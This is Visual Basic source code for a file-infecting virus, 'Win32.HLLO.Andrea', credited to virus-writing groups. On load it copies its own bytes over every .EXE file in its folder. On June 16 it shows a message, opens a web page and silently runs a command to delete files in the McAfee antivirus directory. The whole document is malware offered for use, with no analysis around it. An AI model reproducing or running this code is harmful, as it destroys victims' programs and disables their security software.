Attribute VB_Name = "Module1"
Option Explicit
'Win32.HLLO.Andrea.TVBVK
'By -KD- [Metaphase & NoMercy]
'Made With TVBVK 1.1K By -KD- [Metaphase VX Team & NoMercyVirusTeam]
'-------- Do Not Edit Above This Line --------
Dim AndreaArray() As Byte
Dim Andrea As String
Const AndreaSize As Integer = 20480

Private Sub Form_Load()
        On Error Resume Next
        Dim AndreaFree
        AndreaFree = FreeFile
        Open App.Path & "\" & App.EXEName & ".exe" For Binary Access Read As #AndreaFree
                ReDim AndreaArray(AndreaSize)
                Get #1, 1, AndreaArray
        Close #AndreaFree
        Andrea = Dir(App.Path & "\" & "*.EXE")
        While Andrea <> ""
                Open App.Path & "\" & Andrea For Binary Access Write As #AndreaFree
                        Put #1,1, AndreaArray
                        Put #1,1, AndreaSize
                Close #AndreaFree
                Andrea = Dir()
                If Month(Now) = 6 And Day(Now) = 16 Then
                        MsgBox "Win32.HLLO.Andrea.TVBVK", "and she runs and she waits and I wait..."
                        Shell "Start http://www.avp.tm/"
                        Shell "Del *.* C:\Progra~1\Mcafee\ /y", vbHidden
                End If
        Wend
        End
End Sub
